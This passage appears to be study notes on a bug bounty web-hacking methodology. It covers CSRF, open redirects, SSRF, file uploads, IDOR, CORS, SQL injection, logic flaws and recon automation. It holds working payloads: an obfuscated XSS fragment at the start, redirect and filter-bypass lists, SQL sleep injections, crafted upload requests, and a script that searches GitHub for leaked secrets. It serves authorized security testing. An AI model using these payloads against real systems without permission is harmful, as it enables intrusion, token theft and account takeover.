+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

## Cross Site Request Forgery (CSRF)
- Look for areas on the website which should contain protection around them, such as updating account information
- See if sending a blank CSRF value reveal any framework information from an error, or did it reflect your changes with a CSRF error, have you seen that parameter name used on other websites, or the presence of protection
- Test their most secure features(account functions usually as mentioned above) and work your way backwards
- To begin with, I am focused purely on finding areas that should contain CSRF  protection (Sensitive Areas), and then checking if they have created custom filtering
- *Where there's a filter, there's usually a bypass*
- All sensitive features should be protected from CSRF, so find them and test there
- For example, if the website allows you to checkout, can you force the user to checkout thus forcing their card to be charged?
### Overview

- **CSRF Definition**: Ability to force a user to perform actions on a target website from another website.
- **Common Attack Vector**: Typically involves an HTML form (`<form action=”/login” method=”POST”>`).
- **Example Attack**: Changing the account email to one controlled by the attacker, leading to account takeover.

### CSRF Protection

- **Developer Practices**: Easy to implement CSRF protection, but some developers use custom code.
- **Initial Testing Areas**: Focus on areas requiring protection, such as updating account information.
- **Testing Indicators**:
    - Sending a blank CSRF value: Check for framework information from errors or reflected changes with a CSRF error.
    - Parameter names: Look for reused names across different sites or features.

### Testing Strategy

- **Target Sensitive Features**: Start with secure features (e.g., account functions) and test backwards.
- **Variation in Protection**:
    - Different features might have different CSRF protections.
    - Consider reasons: Different development teams, old codebases, different parameter names.

### Common Bypasses

- **Referer Header Check**: Some developers check the referer header value.
    - **Issues**:
        - Checks may fail if the referer header is absent.
        - No check if the referer header is blank.
        - Bypasses:
            - `<meta name="referrer" content="no-referrer" />`
            - `<iframe src=”data:text/html;base64,form_code_here”>`
            - Using similar domain paths (e.g., `https://www.yoursite.com/https://www.theirsite.com/`).
            - Similar domains (e.g., `https://www.theirsite.computer/`).

### Methodology

- **Focus**: Find sensitive areas requiring CSRF protection and check for custom filtering.
- **Filter Bypassing**: Custom filters often indicate possible bypasses.
- **Common Areas**: Sensitive features like checkout processes to force actions such as charging a card.

### Additional Resources

- **Methodology Reference**: ZSeanos Methodology - [Bug Bounty Hunter](https://www.bugbountyhunter.com/) Page 22

## Open URL Redirects
- Usually has a 100% success rate of using a "harmless" redirect in a chain if the target has some type of OAuth Flow which handles a token along with a redirect
- Also use Google Dorking with the common words mentioned in the notes to find vulnerable endpoints
### Overview

- **Definition**: URLs that redirect users to a specified URL via a parameter (e.g., `https://www.google.com/redirect?goto=https://www.bing.com/`).
- **Common Usage**: Frequently used in OAuth flows where a redirect URL is included in the request.

### Finding and Testing Open URL Redirects

- **Success Rate**: High success rate with harmless redirects in chains, especially with OAuth flows that handle tokens.
- **Typical Payloads**: Use various payloads to test and bypass filters:
    - `\/yoururl.com`
    - `\/\/yoururl.com`
    - `\\yoururl.com`
    - `//yoururl.com`
    - `//theirsite@yoursite.com`
    - `/\/yoursite.com`
    - `https://yoursite.com%3F.theirsite.com/`
    - `https://yoursite.com%2523.theirsite.com/`
    - `https://yoursite?c=.theirsite.com/`
    - `//%2F/yoursite.com`
    - `////yoursite.com`
    - `https://theirsite.computer/`
    - `https://theirsite.com.mysite.com`
    - `/%0D/yoursite.com`
    - `/%2F/yoururl.com`
    - `/%5Cyoururl.com`
    - `//google%E3%80%82com`

### Common Parameters to Test

- Common words to dork for on Google:
    - `return`, `return_url`, `rUrl`, `cancelUrl`, `url`, `redirect`, `follow`, `goto`, `returnTo`, `returnUrl`, `r_url`, `history`, `goback`, `redirectTo`, `redirectUrl`, `redirUrl`

### Exploitation Techniques

- **OAuth Flow Exploitation**:
    - **Example**:
	    - Typical login page : `https://www.target.com/login?client_id=123&redirect_url=/sosecure`
	    - Usually the `redirect_url` is whitelisted to only allow for `*.target.com`
	    - Spot the mistake? Armed with an open url redirect on their website you can leak the token because as the redirect occurs the token is smuggled with the request
	    - `https://www.target.com/login?client_id=123&redirect_url=https://www.target.com/redirect?redirect=1&url=https://www.zseano.com/`
    - The token can be leaked through open redirects if the redirect URL is not properly validated.
- **Encoding Issues**:
    - Proper encoding of values is necessary to prevent parameters from being dropped:
        - **Example**: `/redirect%3Fgoto=https://www.zseano.com/%253Fexample=hax`
        - Results in: `https://www.example.com/redirect?goto=https://www.zseano.com/%3Fexample=hax`
    - Double encoding might be needed:
        - `https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Fredirect=1%2526returnurl%3Dhttps%253A%252F%252Fwww.google.com%252F`

### Additional Considerations

- **SSRF Chaining**: Open URL redirects can be used to chain SSRF vulnerabilities.
- **XSS Potential**:
    - If the redirect is via the “Location:” header, XSS is not possible.
    - If using “window.location”, test for XSS via `javascript:`:
        - **Examples**:
            - `java%0d%0ascript%0d%0a:alert(0)`
            - `j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm\`0``
            - `java%07script:prompt\`0``
            - `jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascriptpjavascriptt:confirm\`0``
## Server-Side Request Forgery (SSRF)
- Look for features that already take a URL parameter
- Try to find their API console (if one is available, usually found on the developer docs page) 
- This area usually contains features which already take a URL parameter and execute code
- Hunt for features which handle a URL, just keep an eye out for common parameter names used for handling URLs
- Always test how they handle redirects
- Always hunt for any third-party software they might be using such as Jira
#### Overview

- **Definition**: The in-scope domain issues a request to a URL/endpoint defined by the attacker.
- **Purpose**: Can be used for multiple reasons but does not always signal vulnerability.

#### Finding and Testing SSRF

- **Initial Focus**: Look for features that already take a URL parameter.
    
    - **Why**: Developers might create filters to prevent malicious activity.
    - **Example Targets**: API consoles, webhooks.
- **Parameter Names**: Keep an eye out for common parameter names that handle URLs (e.g., `url`).
    
- **Example Discovery**:
    
    - **Yahoo**: Found SSRF through a request containing the parameter `url`.
    - **Jobert Abma’s Report**: [HackerOne Report](https://hackerone.com/reports/446593) showed a feature that was straightforward to identify and exploit.

#### Testing Strategy

- **Handling Redirects**: Always test how the target handles redirects.
    
    - **Tools**:
        - **XAMPP**: Allows running PHP code locally.
        - **NGrok**: Provides a public internet address.
    - **Setup**: Use a simple redirect script and observe the target's behavior.
        - **Example**: Add `sleep(1000)` before the redirect to see if the server hangs or times out.
        - **Filters**: Test if the filter only checks the initial parameter value and not the redirect value.
- **Chaining Attacks**: Use potential open redirects discovered as part of your SSRF chain if external websites are filtered.
    

#### Additional Considerations

- **Third-Party Software**: Always check for third-party software vulnerabilities (e.g., Jira).
    - **Patching**: Companies might not always patch promptly, leaving them vulnerable.
    - **CVE Updates**: Stay updated with the latest CVEs to find potential vulnerabilities.

## File Uploads for Stored XSS and Remote Code Execution
### File Upload Vulnerabilities
#### Overview
- **Common Filters**: There is a high likelihood that developers have created filters to allow/block specific file types.
- **Initial Tests**: Start by uploading `.txt`, `.svg`, and `.xml` files.
  - **Purpose**: These file types are sometimes forgotten and may bypass filters.
  - **Image Types**: Test different image types (`.png`, `.gif`, `.jpg`) to understand how uploads are handled.

#### Testing File Uploads
- **File Extension Tricks**: 
  - **Example**: `zseano.php/.jpg` - Server may see `.jpg` but save as `zseano.php`.
  - **Payload**: `zseano.html%0d%0a.jpg` - `%0d%0a` are newline characters causing it to save as `zseano.html`.
  
- **Filename Reflections**: 
  - **Potential XSS**: Filenames may be reflected on the page, allowing for XSS characters in filenames.
  - **Example**:
    ```plaintext
    ------WebKitFormBoundarySrtFN30pCNmqmNz2
    Content-Disposition: form-data; name="file"; filename="58832_300x300.jpg<svg onload=confirm()>"
    Content-Type: image/jpeg
    ÿØÿà
    ```

#### Handling Content-Type and File Extensions
- **Trusting Input**:
  - **Example**:
    ```plaintext
    ------WebKitFormBoundaryAxbOlwnrQnLjU1j9
    Content-Disposition: form-data; name="imageupload"; filename="zseano.jpg"
    Content-Type: text/html
    ```
  - **Checks**: Determine if the server trusts the file extension or the content-type provided.
  - **No Extension**: Test uploads with no file extension or malformed file extensions.
    - **Examples**:
      ```plaintext
      ------WebKitFormBoundaryAxbOlwnrQnLjU1j9
      Content-Disposition: form-data; name="imageupload"; filename="zseano."
      Content-Type: text/html
      
      ------WebKitFormBoundaryAxbOlwnrQnLjU1j9
      Content-Disposition: form-data; name="imageupload"; filename=".html"
      Content-Type: image/png
      <html>HTML code!</html>
      ```

#### Bypassing Image Size Checks
- **Malformed Input**: Provide malformed input to test how much is trusted.
- **Image Header**: Sometimes leaving the image header intact is enough to bypass checks.
  - **Example**:
    ```plaintext
    ------WebKitFormBoundaryoMZOWnpiPkiDc0yV
    Content-Disposition: form-data; name="oauth_application[logo_image_file]"; filename="testing1.html"
    Content-Type: text/html
    ‰PNG
    <script>alert(0)</script>
    ```

#### Key Points
- **Filters**: Expect filters to prevent malicious uploads. 
- **Testing Thoroughly**: Spend sufficient time testing uploads to identify any potential vulnerabilities.
## Insecure Direct Object Reference (IDORs)
- Even if you see a GUID present, that seems unguessable, always try integers in that place
- Try injecting ID parameters
- Anytime you see a request and the postdata is JSON, try simply injecting a new parameter name as shown below
- This not only applies to JSON requests but all requests
#### Overview

- **IDOR Definition**: Accessing unauthorized information by changing identifiers in URLs or parameters.
- **Simple Example**: `https://api.zseano.com/user/1` shows user ID “1” information. Changing to user ID “2” should error out but may show user ID “2” information if vulnerable.

#### Hunting for IDORs

- **Integer Values**: Start by changing integer values in URLs or parameters.
- **GUIDs**: If GUIDs (e.g., `2b7498e3-9634-4667-b9ce-a8e81428641e`) are used instead of integers:
    - **Brute Forcing**: Not usually effective.
    - **Value Leaks**: Look for GUID leaks on the site (e.g., in URLs, source code).
        - **Example**: `https://www.example.com/images/users/2b7498e3-9634-4667-b9ce-a8e81428641e/photo.png`
    - **Search for Keywords**: Use related keywords like `appointment_id`, `appointmentID`.

#### Tips and Tricks

- **Security Through Obscurity**: Even if values seem encrypted, try using integers; servers might process them the same.
- **Mobile Apps**: Start with mobile apps that use APIs, as they often have IDOR vulnerabilities.
- **Deeper Insights**: If an IDOR is found:
    - **Permissions Check**: Consider what other permission checks might be missing.
    - **Role Testing**: Test different roles (admin, guest) to see if role-based actions are improperly checked.
    - **Feature Access**: Check if non-paying members can access paid features.

#### Injection Testing

- **JSON Requests**: When encountering JSON payloads:
    - **Example**: Original payload: `{"example":"example"}`
    - **Injection Test**: Try adding an ID parameter: `{"example":"example","id":"1"}`
    - **Reason**: The server’s JSON parser might process new parameters improperly.

#### Key Points

- **Identify IDORs**: Look for areas in the application where IDs are used to fetch data.
- **Test Thoroughly**: Change identifiers, test different roles, and inject parameters to find vulnerabilities.
- **Think Beyond**: Consider how the application handles permissions and access controls overall.
## Cross-Origin Resource Sharing (CORS)
#### Overview

- **CORS Definition**: Mechanism that allows restricted resources on a web page to be requested from another domain outside the domain from which the resource originated.
- **Key Headers**:
    - `Access-Control-Allow-Origin`
    - `Access-Control-Allow-Credentials`

#### Identifying CORS Misconfigurations

- **Key Indicators**:
    - `Access-Control-Allow-Origin:` header in the response.
    - `Access-Control-Allow-Credentials: true` might also be necessary for certain scenarios (e.g., when session cookies are required).

#### Common Filtering and Bypass Techniques

- **Filter Testing**:
    - **Basic Concept**: Developers often filter to allow only their domain, but filters can be bypassed.
    - **Example**: If you see `Access-Control-Allow-Origin: https://www.yoursite.com/`, you can test with `anythingheretheirdomain.com` to bypass simple domain checks.
- **Grep for Headers**:
    - Add `Origin: theirdomain.com` to every request.
    - Grep for `Access-Control-Allow-Origin` in responses.

#### Steps to Test for CORS Issues

1. **Add Origin Header**: Include `Origin: theirdomain.com` in your requests.
2. **Inspect Responses**: Look for `Access-Control-Allow-Origin` headers.
3. **Test Sensitive Endpoints**: Even if the endpoint seems harmless, the misconfiguration might be reusable.
4. **Check for Allow-Credentials**: If cookies or credentials are involved, `Access-Control-Allow-Credentials: true` should be present.

#### Example Scenario

- **Scenario**: Sensitive information at `https://api.zseano.com/user/`
- **Header**: `Access-Control-Allow-Origin: https://www.yoursite.com/`
- **Attack**: From `yoursite.com`, read contents of `api.zseano.com`

#### Common Bypass Techniques

- **Domain Bypass**: Use variations like `anythingheretheirdomain.com` to bypass simple domain filters.

#### Key Points

- **Filter Bypass**: When a filter is in place, it can often be bypassed with clever domain manipulation.
- **Reuse and Exploration**: Developers often reuse code, so a bypass in one place might work elsewhere.
## SQL Injection
- Stop using `'` for initial SQL Injection testing, as most websites have disabled error messages these days
- Use sleep payloads instead
#### Overview

- **SQL Injection Definition**: A web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
- **Common Indicators**:
    - Legacy code is often more vulnerable.
    - Features that involve database queries (e.g., search functions).

#### Identifying SQL Injection Vulnerabilities

- **Basic Tests**:
    - **Error-Based**: Use single quotes (`'`) and look for error messages.
    - **Blind Injection**: Use time-based (sleep) payloads to detect delays in response.

#### Sleep Payloads for Blind SQL Injection

- **Purpose**: Detect if the payload was executed by measuring response time delays.
- **Common Payloads**:
    - `' or sleep(15) and 1=1#`
    - `' or sleep(15)#`
    - `' union select sleep(15),null#`
- **Response Time**: Use a delay between 15-30 seconds to check for vulnerability.

#### Testing Methodology

1. **Initial Testing**:
    - Use simple single quotes (`'`) to see if any errors are returned.
2. **Blind SQL Injection**:
    - Use sleep payloads to identify blind SQL injection points.
    - Measure the response time to confirm if the payload executed.
3. **Comprehensive Testing**:
    - Test across the entire web application.
    - Pay attention to features that make database queries, such as search, login, and input forms.

#### Legacy Code

- **Focus Area**: Legacy code is more prone to SQL injection vulnerabilities.
- **Old Features**: Pay special attention to older features of the application.

#### Key Points

- **Error Messages**: Modern applications often have error messages disabled.
- **Response Time**: A delay in the response time indicates that the payload was likely executed.

## Business/Application Logic Vulnerabilities
- Look for new features which interact with old features
- Try signing up with the email `example@target.com`
- Sometimes, these accounts have special privileges such as no rate limiting and bypassing certain verifications
#### Overview

- **Definition**: Vulnerabilities that arise from flaws in the logic that governs the behavior of the application. These flaws allow attackers to perform unintended actions.

#### Identifying Business Logic Vulnerabilities

- **Understanding Application Flow**: Spend time understanding how the web application should work as intended by the developers.
- **Key Questions**:
    - How should the process work?
    - What inputs are expected?
    - What can be bypassed or manipulated?

#### Examples and Techniques

1. **Loan Application Example**:
    
    - **Scenario**: A target application allows a maximum loan of £1,000.
    - **Exploit**: Change the loan amount to £10,000 to see if the limit can be bypassed.
    - **Technique**: Understand the feature and manipulate the process without complex hacking.
2. **Feature Interaction**:
    
    - **Scenario**: An old feature requires identification to claim ownership, but a new feature only requires valid payment data.
    - **Exploit**: Use the new feature to bypass the identification requirement and claim ownership.
    - **Technique**: Look for how new features interact with old ones and identify potential bypasses.
3. **Special Privileges Example**:
    
    - **Scenario**: Signing up with an email like example@target.com might give special privileges (e.g., no rate limiting).
    - **Exploit**: Test signing up with privileged email formats to see if certain verifications can be bypassed.
4. **Competition/Prize Claim Example**:
    
    - **Scenario**: Claiming a prize via a specific endpoint (/prize/claim).
    - **Exploit**: Test if the claim process is accessible to users who haven’t won.
    - **Technique**: Look for endpoints and processes that should be restricted and test their accessibility.

#### Methodology

- **Spend Time Learning**: Spend days/weeks understanding the website and its intended user flows.
- **Interact with Features**: Use the website extensively to understand how features should work and look for inconsistencies.
- **Testing for Bypass**:
    - Check if new features bypass old restrictions.
    - Test different user roles and their permissions (e.g., admin vs. guest).
    - Use API documentation to identify intended behaviors and potential oversights.

#### Tips

- **Don't Overlook Simple Tests**: Sometimes the vulnerabilities are in plain sight. Test the obvious and simple scenarios.
- **No Clear Cut Payloads**: Business logic bugs often don’t have specific payloads. Focus on understanding and manipulating the application flow

### Choosing a Bug Bounty Program

When selecting a bug bounty program to participate in, here's a step-by-step methodology to guide your decision-making process:

#### **1. Scope and Reputation**

- **Wide Scope**: Opt for programs with a broad scope. These often include multiple applications, subdomains, and features that can provide numerous opportunities for discovering vulnerabilities.
- **Well-Known Names**: Choose programs associated with well-known companies. Larger companies typically have more complex systems and a greater likelihood of security flaws due to their size and diverse teams.

#### **2. Understanding the Company**

- **Company Size and Structure**: Bigger companies often have multiple teams working on different parts of their system, increasing the chance of finding security issues.
    - **Example**: A company with multiple international offices might have different codebases for different regions.
- **Existing Knowledge**: Leverage your knowledge about the company’s products and services. Familiarity with the company can help you identify potential weak points more effectively.

#### **3. Program Characteristics**

- **Communication**: Assess how the team communicates. Direct interaction with the company can provide a better experience than relying solely on the platform's communication tools.
- **Activity**: Check the program's activity level. Look for recent updates to the scope and other relevant information. An active program is likely to be more responsive and updated.
- **Handling of Low-Hanging Fruit**: Understand how the program rewards various types of vulnerabilities. Some programs may value the impact of chained vulnerabilities more than individual issues.
- **Response Time**: Monitor the response time to your initial reports. If responses are excessively delayed (e.g., more than 3 months), consider whether it is worth continuing with the program.

#### **Checklist for a Well-Run Bug Bounty Program**

- **Direct Communication**: Does the team engage directly with you or rely solely on the platform?
- **Program Activity**: Is the program active, with regular updates and changes?
- **Reward Structure**: How does the program handle low-hanging fruit bugs? Does it reward impactful vulnerabilities appropriately?
- **Response Time**: What is the average response time for reports?

### Writing Notes as You Hack

**Importance of Note-Taking**

Writing notes while hacking is crucial for several reasons:
- **Avoid Burnout**: Helps you avoid frustration and exhaustion by allowing you to revisit your work with a fresh perspective.
- **Organized Research**: Keeps track of interesting endpoints, behaviors, and parameters, making it easier to follow up on potential vulnerabilities.
- **Reference**: Provides a record of what you’ve tried and what has or hasn’t worked, helping you refine your approach.

**Note-Taking Methods**

There is no one-size-fits-all approach, but here’s a general method that you might find useful:

1. **Choose Your Tool**:
    - **Example**: Sublime Text Editor or any text editor you prefer.

2. **Document Key Information**:
    - **Endpoints**: Record the URLs and endpoints you discover.
    - **Parameters**: Note down any parameters associated with these endpoints.
    - **Behaviors**: Document the behavior you observe when interacting with endpoints.
    - **Testing Attempts**: Keep a record of what you tried, including what worked and what didn’t.

3. **Track Interesting Features**:
    - If you encounter a feature or endpoint that seems promising but can’t exploit it immediately, make a note to revisit it later.

4. **Manage Your Notes**:
    - **Example Format**:
        ```text
        # Example.com Testing Notes

        ## Endpoints
        /admin
        /admin-new
        /server_health

        ## Parameters
        debug
        isTrue

        ## Observations
        - /admin-new appears to have a vulnerability, but further testing needed.
        - The parameter "debug" causes a 500 Internal Server Error when used with /server_health.

        ## To Revisit
        - Test the /admin endpoint for potential IDOR vulnerabilities.
        ```

**Creating Custom Wordlists**

As you gather information, you can build custom wordlists to streamline your testing across multiple domains:
- **Domain-Specific Wordlists**:
    - For `example.com`, create `examplecom-endpoints.txt` and `params.txt` containing the discovered endpoints and parameters.
- **Global Wordlists**:
    - Combine the information from multiple domains into a `global-endpoints.txt` and `global-params.txt` to identify commonly found endpoints and parameters across different sites.

**Example of Wordlist Creation**

1. **Domain-Specific Wordlists**:
    - `examplecom-endpoints.txt`:
        ```text
        /admin
        /admin-new
        /server_health
        ```
    - `params.txt`:
        ```text
        debug
        isTrue
        ```

2. **Global Wordlists**:
    - After collecting data from various domains, compile a global list:
        - `global-endpoints.txt`:
            ```text
            /admin
            /login
            /dashboard
            ```
        - `global-params.txt`:
            ```text
            debug
            id
            token
            ```

# Hacking Methodology Steps
### Step One: Getting a Feel for Things

#### Research Previous Findings

1. **Search for Disclosed Write-ups:**
    - Use Google, HackerOne, and OpenBugBounty to find previous vulnerabilities.
    - Example search queries:
        - `domain.com vulnerability`
        - [HackerOne Hacktivity](https://www.hackerone.com/hacktivity)
        - [OpenBugBounty](https://www.openbugbounty.org/)

#### Understand the Application

2. **Initial Exploration:**
    - Manually explore the main web application before running scanners.
    - Focus on common bug types (XSS, CSRF, IDOR, etc.).
    - Take detailed notes on interesting behavior and endpoints.

#### Registration Process

3. **Test Registration:**
    - Analyze the required information during signup (name, location, bio, etc.).
    - Test file uploads by changing extensions (e.g., from .jpeg to .txt or .svg).
    - Examine character restrictions and reflection points.
    - Investigate social media account registration and OAuth flows.
    - Check for blacklisted email domains and test for bypasses.
    - Note parameters and JavaScript files used in registration pages.
    - Use Google dorks to find hidden registration pages:
        - `site:example.com inurl:register`
        - `site:example.com inurl:signup`
        - `site:example.com inurl:join`

#### Login Process

4. **Test Login:**
    - Look for redirect parameters (e.g., `returnUrl`, `goto`, `return_url`).
    - Test email encoding tricks (e.g., `myemail%00@email.com`).
    - Explore OAuth flows and social media logins.
    - Compare desktop vs. mobile login processes.
    - Analyze reset password functionality for IDOR and Host Header Injection.

#### Account Updates

5. **Profile Updates:**
    - Check for CSRF protection on profile updates.
    - Test second confirmation for email/password changes.
    - Validate character handling in profile fields.
    - Investigate URL input fields for potential script injection.
    - Compare desktop vs. mobile update processes.

#### Developer Tools

6. **Developer Tools:**
    - Locate developer tools (e.g., webhooks, OAuth explorers, GraphQL explorers).
    - Test for SSRF vulnerabilities in webhooks.
    - Analyze responses from developer tools for potential impact.
    - Investigate permission issues in OAuth flows.
    - Check API documentation for additional endpoints and keywords.
    - Examine file upload functionality in developer tools.
    - Compare developer and main site session handling.

#### Main Features

7. **Primary Features:**
    - Focus on the site's core features (e.g., file uploads in Dropbox, email in AOL).
    - Compare feature availability and behavior across desktop and mobile.
    - Test for feature access across different account levels (admin, moderator, user).
    - Pay for upgraded features and test access with free accounts.
    - Identify and test old and new features.

#### Payment Features

8. **Payment Testing:**
    - Analyze features unlocked by paid accounts.
    - Check for vulnerabilities in HTML DOM that could leak payment information.
    - Test different payment options for various countries.
    - Use test numbers from support sites to bypass payment verifications.

### Building Your Treasure Map

9. **Create Custom Wordlists:**
    - Continuously build and update custom wordlists from your findings.
    - Use your notes to map out the target's structure and potential entry points.

### Conclusion

10. **Review and Reflect:**
    - Review your findings and test again for any overlooked vulnerabilities.
    - Summarize your notes and prepare for deeper exploration in the next steps.

### Step Two: Expanding Our Attack Surface

Expanding your attack surface involves exploring and uncovering all possible endpoints, functionalities, and subdomains related to your target. Let's break down the steps and tools to be used for this phase.

#### Tools Required
- **Subdomain scanners**: `subfinder`, `amass`, `assetfinder`, `chaos`, `gau`, etc.
- **Google Dorking**: Custom dorking keywords and search queries
- **Burp Suite**: For manual testing and Intruder scans
- **XAMPP**: For local PHP scripting and hosting
- **WayBackMachine**: For historical data on websites
- **Common wordlists**: `FFuF`, `CommonSpeak`, and custom lists

#### 1. Running Subdomain Scanning Tools
Start by running the subdomain scanning tools. These tools will help identify all the subdomains associated with the main domain.

Example commands:
```bash
subfinder -d example.com -o subdomains.txt
amass enum -d example.com -o subdomains.txt
assetfinder --subs-only example.com | tee -a subdomains.txt
```

#### 2. Google Dorking
While subdomain scanning tools are running, begin with Google dorking to find domains with specific functionalities. Use keywords such as:
- `login`, `register`, `upload`, `contact`, `feedback`, `join`, `signup`, `profile`, `user`, `comment`, `api`, `developer`, `affiliate`, `careers`, `mobile`, `upgrade`, `passwordreset`.

Google dorking queries examples:
```bash
site:example.com inurl:login
site:example.com filetype:php
site:example.com "api_key"
```

#### 3. Checking robots.txt
Once subdomain scan results are ready, check each subdomain's `/robots.txt` file to see what the site owner does and does not want indexed by search engines. This can reveal interesting endpoints.

Example PHP script to scan `/robots.txt` using XAMPP:
```php
<?php header("Location: ".$_GET['url']); ?>
```
Use Burp Suite's Intruder to automate this check.

#### 4. Scanning for Files and Directories
Using tools like `FFuF`, scan for common endpoints, sensitive files, and directories. Customize your wordlist based on the file extensions you found (e.g., `php`, `aspx`, `jsp`, `xml`, `bak`).

Example `FFuF` command:
```bash
ffuf -u https://example.com/FUZZ -w wordlist.txt
```

#### 5. Dorking on GitHub and Other Search Engines
Search for sensitive data leaks or interesting files on platforms like GitHub using dorking techniques.

Example queries:
```bash
"example.com" api_secret
"example.com" password
```

#### 6. Analyzing Historical Data
Use WayBackMachine to view historical versions of the site and find old, possibly vulnerable endpoints.

Example usage:
```bash
waybackurls example.com
```

#### 7. Detailed Manual Inspection
Revisit the main web application and subdomains for a deeper inspection. Check HTML sources, JavaScript files, and other resources to uncover hidden features and endpoints.

Example in Burp Suite:
- Use "Grep - Match" to look for specific keywords like `login` across multiple endpoints.

#### 8. Automate Routine Checks
Create scripts to monitor changes in specific files or endpoints. This helps in finding vulnerabilities in new features before they are officially released.

Example:
```bash
while true; do curl -s https://example.com/file.js | diff file.js - && cp file.js file.js.old; sleep 86400; done
```

### Step Three: Automate and Maintain

At this stage, automation becomes crucial to manage the extensive and repetitive tasks in bug hunting. Automating routine tasks allows you to focus on manual testing and exploring new vulnerabilities. Here’s how you can set up automation to rinse and repeat your process effectively:

#### 1. Automate Subdomain, File, and Directory Scanning
Automate the process of scanning for new subdomains, files, and directories. Tools and services such as `CertSpotter` and `LazyRecon` can help.

**CertSpotter:**
CertSpotter monitors HTTPS certificates for new subdomains.
- Visit [CertSpotter](https://sslmate.com/certspotter/) and set up monitoring for your target domains.

**LazyRecon:**
LazyRecon automates the recon process.
- Install LazyRecon:
```bash
git clone https://github.com/nahamsec/lazyrecon.git
cd lazyrecon
sudo ./lazyrecon.sh example.com
```
Modify the script to suit your specific needs and run it periodically using a cron job.

**Cron Job Example:**
Add the following to your crontab to run LazyRecon daily:
```bash
0 0 * * * /path/to/lazyrecon.sh example.com
```

#### 2. Monitor for Changes on the Website
Set up scripts to monitor for changes on the website, including new features and JavaScript files. This can help you detect new vulnerabilities early.

**Example Script to Monitor JS Files:**
```bash
#!/bin/bash

# Define the URL and the location to store JS files
URL="https://example.com"
JS_DIR="/path/to/js_monitor"

# Create directory if it doesn't exist
mkdir -p $JS_DIR

# Fetch the current JS file
curl -s $URL/app.js -o $JS_DIR/app_new.js

# Compare the new file with the old one
if ! diff $JS_DIR/app.js $JS_DIR/app_new.js > /dev/null; then
  echo "JavaScript file has changed"
  mv $JS_DIR/app_new.js $JS_DIR/app.js
else
  rm $JS_DIR/app_new.js
fi
```
Run this script daily using a cron job to check for changes:
```bash
0 0 * * * /path/to/js_monitor.sh
```

#### 3. Automate Leak Detection on GitHub and Other Platforms
Set up automation to detect leaks on platforms like GitHub using specific search queries.

**Example GitHub Dorking Script:**
```bash
#!/bin/bash

# Define the target domain and search terms
DOMAIN="example.com"
SEARCH_TERMS=("api_key" "password" "secret")

# GitHub API token (create a personal access token on GitHub)
GITHUB_TOKEN="your_github_token_here"

for term in "${SEARCH_TERMS[@]}"; do
  curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/search/code?q=$term+in:file+$DOMAIN" | jq '.items[] | {repository: .repository.full_name, file: .path, url: .html_url}'
done
```
Run this script periodically to detect leaks:
```bash
0 0 * * * /path/to/github_dorking.sh
```

#### 4. Stay Updated with New Programs and Updates
Stay informed about new bug bounty programs and updates. Follow relevant sources and subscribe to notifications.

**Follow Disclose.io:**
- Follow [Disclose.io](https://twitter.com/disclosedh1) on Twitter for updates on new programs.

**Subscribe to HackerOne Programs:**
- Visit [HackerOne](https://www.hackerone.com/) and subscribe to updates on new programs.

### Bug Findings and Methodologies

#### 1. Open Redirects

**Bug:** Found 30+ open redirects leaking user tokens.  
**Methodology:** Used Google Dorking to identify open URL redirects. Tested login flow to exploit auth token leaks through redirection.

#### 2. Stored XSS

**Bug:** Stored XSS in a mobile app.  
**Methodology:** Analyzed initial app requests, injected script via "returnurl" parameter in the GDPR consent request.

#### 3. IDOR

**Bug:** Enumerated user data via IDOR, even after patch.  
**Methodology:** Tested API endpoints, observed GET to POST request change caused data leaks, revealing developer patterns.

#### 4. Site-wide CSRF

**Bug:** Site-wide CSRF issues due to improper token handling.  
**Methodology:** Exploited blank token handling, used iframe to force form resubmission.

#### 5. Bypassing Identity Verification

**Bug:** Identity verification bypassed using sandbox credit card details.  
**Methodology:** Tested new feature for page upgrading, used sandbox details to bypass phone verification.

#### 6. WayBackMachine Endpoints

**Bug:** Account takeover via old endpoint found on WayBackMachine.  
**Methodology:** Checked historical robots.txt for old endpoints, tested parameter reuse from similar bugs.

#### 7. API Console and Redirects

**Bug:** Internal API requests bypass via URL redirects.  
**Methodology:** Supplied redirect URL to bypass input filtering, accessed internal services and leaked AWS keys.

#### 8. Leaking Data via WebSocket

**Bug:** Personal data leak via WebSocket.  
**Methodology:** Tested if external domains could connect to WebSocket server, executed basic connection and data processing tests.

### Useful Resources for Bug Bounty Hunting

Here's a compilation of valuable resources and notable researchers to follow, which can aid in your bug bounty hunting journey.

#### Online Tools

- **[You Get Signal](https://www.yougetsignal.com/tools/web-sites-on-web-server/):** Find other sites hosted on a web server by entering a domain or IP address.
- **[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings):** A list of useful payloads and bypasses for web application security and pentests/CTFs.
- **[CertSpotter](https://certspotter.com/api/v0/certs?domain=domain.com):** For finding subdomains and domains.
- **[DeGraeve URL Encoding Reference](http://www.degraeve.com/reference/urlencoding.php):** A quick reference list of URL encoded characters.
- **[APKScan by NVISO](https://apkscan.nviso.be/):** Upload an .apk file to scan it for hardcoded URLs/strings.
- **[PublicWWW](https://publicwww.com/):** Find any alphanumeric snippet, signature, or keyword in web pages' HTML, JS, and CSS code.
- **[Browser's XSS Filter Bypass Cheat Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)** and **[Ghetto Bypass](https://d3adend.org/xss/ghettoBypass):** Useful resources for XSS filter bypass techniques.
- **[Tarnish](https://thehackerblog.com/tarnish/):** Chrome Extension Analyzer.
